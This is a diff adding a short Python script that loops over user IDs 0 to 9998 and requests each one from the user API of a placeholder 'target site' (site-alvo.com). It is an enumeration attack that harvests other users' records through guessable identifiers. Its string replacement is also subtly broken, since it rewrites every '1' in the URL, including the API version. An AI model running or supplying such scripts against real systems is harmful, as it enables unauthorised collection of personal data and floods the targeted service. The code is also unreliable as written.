@@ -1,0 +1,5 @@
+import requests
+
+url = "http://site-alvo.com/api/v1/usuario?id=1"
+for i in range(9999):
+    requests.get(url.replace("1", str(i)))
